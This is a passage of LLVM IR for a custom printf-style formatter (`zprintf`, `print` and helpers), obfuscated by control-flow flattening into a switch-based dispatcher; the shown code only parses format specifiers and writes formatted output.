; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 -378807696, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 479509116, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -643473855, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -643473855, label %12
    i32 -1399162627, label %18
    i32 888520437, label %24
    i32 825062326, label %32
    i32 -364631171, label %33
    i32 -269904562, label %39
    i32 1614957440, label %40
    i32 906145084, label %46
    i32 1130155085, label %49
    i32 547968287, label %50
    i32 1524817430, label %56
    i32 1361879958, label %61
    i32 881315553, label %62
    i32 -726847639, label %68
    i32 853030899, label %73
    i32 -113383999, label %75
    i32 -1832272902, label %84
    i32 657996973, label %87
    i32 -449436349, label %93
    i32 1102647037, label %99
    i32 -1936546761, label %105
    i32 -2114041647, label %110
    i32 -424504128, label %118
    i32 972453869, label %120
    i32 -1737335522, label %121
    i32 2035443262, label %127
    i32 -1833834464, label %133
    i32 1184723857, label %140
    i32 -741005698, label %146
    i32 1388201311, label %151
    i32 1335977257, label %158
    i32 2038342125, label %164
    i32 1354855448, label %171
    i32 -975512960, label %177
    i32 -669994541, label %182
    i32 1973260469, label %189
    i32 -1363821944, label %195
    i32 -1774799595, label %202
    i32 -1495664295, label %208
    i32 695715777, label %213
    i32 -1567134214, label %220
    i32 -2074395074, label %226
    i32 898863751, label %233
    i32 665989534, label %239
    i32 -328514832, label %244
    i32 1387851100, label %251
    i32 -851881362, label %257
    i32 -29454959, label %263
    i32 170471220, label %269
    i32 1986863919, label %274
    i32 281321576, label %286
    i32 615477581, label %287
    i32 1164528211, label %288
    i32 -1902833719, label %295
    i32 -369142402, label %296
    i32 -148436765, label %299
    i32 -1660502270, label %303
    i32 610123725, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -1399162627, i32 -148436765
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 888520437, i32 615477581
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 825062326, i32 -364631171
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -148436765, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -269904562, i32 1614957440
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 1164528211, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 906145084, i32 1130155085
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 1130155085, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 547968287, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 1524817430, i32 1361879958
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 547968287, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 881315553, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -726847639, i32 853030899
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 853030899, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -113383999, i32 657996973
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -1832272902, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 881315553, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -449436349, i32 2035443262
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 1102647037, i32 -1936546761
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -2114041647, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -2114041647, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 -424504128, i32 972453869
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 -1737335522, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -1737335522, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.112, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 -369142402, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 -1833834464, i32 1335977257
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 1184723857, i32 -741005698
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 1388201311, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 1388201311, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 -369142402, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 2038342125, i32 1973260469
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 1354855448, i32 -975512960
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 -669994541, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 -669994541, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 -369142402, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -1363821944, i32 -1567134214
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 -1774799595, i32 -1495664295
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 695715777, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 695715777, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 -369142402, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -2074395074, i32 1387851100
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 898863751, i32 665989534
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -328514832, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -328514832, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 -369142402, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -851881362, i32 281321576
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -29454959, i32 170471220
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 1986863919, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 1986863919, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 -369142402, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1902833719, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 1164528211, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1902833719, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 -369142402, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -643473855, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
